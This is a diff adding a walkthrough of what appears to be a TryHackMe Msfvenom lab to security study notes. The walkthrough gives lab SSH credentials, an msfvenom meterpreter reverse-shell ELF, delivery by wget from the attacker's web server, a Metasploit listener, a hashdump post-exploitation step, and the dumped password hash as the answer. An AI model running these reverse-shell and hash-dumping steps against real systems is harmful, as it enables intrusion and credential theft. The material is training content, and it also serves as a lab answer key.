@@ -312,7 +312,68 @@ In all these examples, LHOST will be the IP address of your attacking machine, a
 - Python  
     `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`  
 
+<details>
+<summary>task</summary>
+Task 6: Msfvenom
+Just read the content, all you’ll get everything you want to answer the question.
 
+#1 Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type “sudo su” to get a root shell, this will make things easier.
+
+ssh murphy@[MACHINE IP]
+
+sudo su
+
+#2 Create a meterpreter payload in the .elf format.
+
+#3 Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_MACHINE_IP:9000/shell.elf to download it to the target machine).
+
+#4 Get a meterpreter session on the target machine.
+
+To get a meterpreter reverse shell, we will make a payload so that we would run that in the user’s shell and access everything from our shell :) For the payload, type the following command in your terminal:
+
+Linux Executable and Linkable Format (elf):
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+
+An easy way of transferring the exploit in user’s shell is by using server. Let’s start a python server in that shell and request for this file:
+
+In attacking machine:
+
+python3 -m http.server 9000
+
+In the machine being attacked:
+
+wget http://ATTACKING_MACHINE_IP:9000/rev_shell.elf
+
+Now remember we need a listener on our shell for RCE:
+
+(Type these commands in the metasploit shell)
+
+use exploit/multi/handler
+
+set payload linux/x86/meterpreter/reverse_tcp
+
+Now just set the LHOST and LPORT the same you did in the exploit.
+Last thing to do is run that file and recieve the connection :
+
+chmod +x rev_shell.elf in the shell we have ssh the account
+
+Start the listener in your machine by the command told above.
+
+Run the file by ./rev_shell.elf
+
+You got the meterpreter reverse shell in your machine ;)
+
+#4 Use a post exploitation module to dump hashes of other users on the system.
+
+msfconsole
+
+run post/linux/gather/hashdump
+
+#5 What is the other user’s password hash?
+
+$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0
+</summary>
 
 
 
